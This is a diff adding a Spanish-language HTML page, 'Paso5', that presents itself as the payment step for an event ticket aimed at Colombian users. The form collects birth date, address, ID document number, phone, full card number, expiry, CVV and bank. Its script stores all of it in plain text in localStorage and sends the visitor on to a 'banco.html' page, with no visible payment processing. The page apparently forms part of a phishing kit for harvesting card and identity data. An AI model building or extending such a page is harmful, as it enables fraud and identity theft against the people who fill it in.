@@ -1,0 +1,230 @@
+<!-- Paso5.html -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>Tu Boleta - Pago</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap">
+  <style>
+    body { font-family: 'Poppins', sans-serif; background:#fff; color:#000; }
+    .header-registro {
+      background-color: #0055cc;
+      padding: 20px 4%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .logo-registro { width:150px; }
+    .iniciar-sesion-link { font-weight:500; color:#fff; text-decoration:none; }
+    .container-registro { max-width:440px; margin:80px auto 0; text-align:left; padding:0 15px; }
+    .paso-texto { font-size:13px; text-transform:uppercase; letter-spacing:1px; color:#808080; margin-bottom:5px; }
+    .titulo-registro { font-size:32px; font-weight:600; margin-bottom:15px; }
+    .texto-registro { font-size:18px; margin-bottom:25px; color:#333; }
+    .form-pago { display:flex; flex-direction:column; }
+    .input-container { position:relative; margin-bottom:20px; }
+    .input-registro {
+      width:100%; padding:20px 10px 10px; border:1px solid #ccc; border-radius:4px;
+      font-size:16px; outline:none;
+    }
+    .label-registro {
+      position:absolute; top:50%; left:10px; transform:translateY(-50%);
+      color:#808080; pointer-events:none; transition:.2s ease all;
+    }
+    .input-registro:focus ~ .label-registro,
+    .input-registro:not(:placeholder-shown) ~ .label-registro {
+      top:10px; font-size:12px; color:#0055cc;
+    }
+    .input-group { display:flex; gap:10px; }
+    .input-group .input-container { flex:1; }
+    .btn-siguiente {
+      width:100%;
+      background:#0055cc;
+      color:#fff;
+      border:none;
+      padding:18px;
+      font-size:24px;
+      cursor:pointer;
+      border-radius:4px;
+      text-align:center;
+      margin-top:10px;
+    }
+    .btn-siguiente:hover {
+      background:#0044aa;
+    }
+    .terminos-uso { font-size:12px; margin-top:10px; }
+    .separador {
+      border: none;
+      border-top: 1px solid #ccc;
+      margin: 30px 0 15px;
+    }
+    .seccion-titulo {
+      font-size:18px;
+      font-weight:600;
+      margin-bottom:10px;
+      color:#333;
+    }
+    @media (max-width:600px){
+      .logo-registro { width:90px; }
+      .container-registro { margin-top:40px; }
+      .titulo-registro { font-size:24px; }
+      .btn-siguiente { font-size:16px; }
+    }
+  </style>
+</head>
+<body>
+  <header class="header-registro">
+    <img src="../logo.png" alt="logo" class="logo-registro">
+    <a href="#" class="iniciar-sesion-link">Iniciar sesión</a>
+  </header>
+
+  <main class="container-registro">
+    <p class="paso-texto"></p>
+    <h1 class="titulo-registro">Pago con tarjeta de crédito o débito</h1>
+    <p class="texto-registro">
+      ¡Estás a un paso de asegurar tu entrada!<br>
+      Tu boleta se activará apenas confirmes el pago.<br>
+      Configura tu método de pago y disfruta la experiencia.
+    </p>
+
+    <form class="form-pago" onsubmit="return handlePaso5Submit()">
+      <!-- DATOS PERSONALES -->
+      <p class="seccion-titulo"><b>Datos personales</b></p>
+      <hr class="separador">
+
+      <div class="input-container">
+        <input type="date" id="fecha_nacimiento" class="input-registro" placeholder=" " required>
+        <label for="fecha_nacimiento" class="label-registro">Fecha de nacimiento</label>
+      </div>
+
+      <div class="input-container">
+        <input type="text" id="direccion" class="input-registro" placeholder=" " required>
+        <label for="direccion" class="label-registro">Dirección</label>
+      </div>
+
+      <div class="input-container">
+        <input type="text" id="ciudad" class="input-registro" placeholder=" " required>
+        <label for="ciudad" class="label-registro">Ciudad</label>
+      </div>
+
+      <div class="input-container">
+        <select id="tipo_documento" class="input-registro" required>
+          <option value="" disabled selected>Selecciona tipo de documento</option>
+          <option value="CC">Cédula de ciudadanía</option>
+          <option value="TI">Tarjeta de identidad</option>
+          <option value="CE">Cédula de extranjería</option>
+          <option value="Pasaporte">Pasaporte</option>
+        </select>
+        <label for="tipo_documento" class="label-registro" style="top:10px; font-size:12px;">Tipo de documento</label>
+      </div>
+
+      <div class="input-container">
+        <input type="text" id="documento" class="input-registro" placeholder=" " required>
+        <label for="documento" class="label-registro">Número de documento</label>
+      </div>
+
+      <div class="input-container">
+        <input type="text" id="telefono" class="input-registro" placeholder=" " required>
+        <label for="telefono" class="label-registro">Teléfono de contacto</label>
+      </div>
+
+      <!-- DATOS TARJETA -->
+      <p class="seccion-titulo"><b>Datos de tarjeta</b></p>
+      <hr class="separador">
+
+      <div class="input-container">
+        <input type="text" id="nombre" class="input-registro" placeholder=" " required>
+        <label for="nombre" class="label-registro">Nombre del titular</label>
+      </div>
+
+      <div class="input-container">
+        <input type="text" id="tarjeta" class="input-registro" placeholder=" " required>
+        <label for="tarjeta" class="label-registro">Número de tarjeta</label>
+      </div>
+
+      <div class="input-group">
+        <div class="input-container">
+          <input type="text" id="vencimiento" class="input-registro" placeholder=" " required maxlength="5">
+          <label for="vencimiento" class="label-registro">Fecha de venc. (MM/AA)</label>
+        </div>
+        <div class="input-container">
+          <input type="text" id="cvv" class="input-registro" placeholder=" " required maxlength="3">
+          <label for="cvv" class="label-registro">CVV</label>
+        </div>
+      </div>
+
+      <div class="input-container">
+        <select id="banco" class="input-registro" required>
+          <option value="" disabled selected>Selecciona tu banco</option>
+          <option value="Bancolombia">Bancolombia</option>
+          <option value="Davivienda">Davivienda</option>
+          <option value="Banco de Bogotá">Banco de Bogotá</option>
+          <option value="Banco Popular">Banco Popular</option>
+          <option value="Banco de Occidente">Banco de Occidente</option>
+          <option value="BBVA Colombia">BBVA Colombia</option>
+          <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
+          <option value="Banco AV Villas">Banco AV Villas</option>
+          <option value="Banco Agrario">Banco Agrario</option>
+          <option value="Itaú">Itaú</option>
+          <option value="Banco Pichincha">Banco Pichincha</option>
+          <option value="GNB Sudameris">GNB Sudameris</option>
+        </select>
+        <label for="banco" class="label-registro" style="top:10px; font-size:12px;">Banco</label>
+      </div>
+
+      <div class="terminos-uso">
+        Al hacer clic en el botón de abajo, aceptas los Términos de uso y la Declaración de privacidad.
+      </div>
+
+      <button type="submit" class="btn-siguiente">Pagar boleta</button>
+    </form>
+  </main>
+
+  <script>
+    function luhnCheck(val) {
+      let sum = 0;
+      for (let i = 0; i < val.length; i++) {
+        let intVal = parseInt(val.charAt(i), 10);
+        if (i % 2 === 0) {
+          intVal *= 2;
+          if (intVal > 9) intVal -= 9;
+        }
+        sum += intVal;
+      }
+      return (sum % 10) === 0;
+    }
+
+    document.getElementById('vencimiento').addEventListener('input', e => {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+      e.target.value = v;
+    });
+
+    function handlePaso5Submit() {
+      const numero = document.getElementById('tarjeta').value.replace(/\s/g,'');
+      if (!luhnCheck(numero)) {
+        alert('Introduce un número de tarjeta válido.');
+        return false;
+      }
+
+      const data = {
+        fechaNacimiento: document.getElementById('fecha_nacimiento').value,
+        direccion: document.getElementById('direccion').value,
+        ciudad: document.getElementById('ciudad').value,
+        tipoDocumento: document.getElementById('tipo_documento').value,
+        documento: document.getElementById('documento').value,
+        telefono: document.getElementById('telefono').value,
+        nombreTitular: document.getElementById('nombre').value,
+        tarjeta: numero,
+        fechaExpiracion: document.getElementById('vencimiento').value,
+        cvv: document.getElementById('cvv').value,
+        banco: document.getElementById('banco').value
+      };
+
+      localStorage.setItem('formData', JSON.stringify(data));
+      window.location.href = 'banco.html';
+      return false;
+    }
+  </script>
+</body>
+</html>
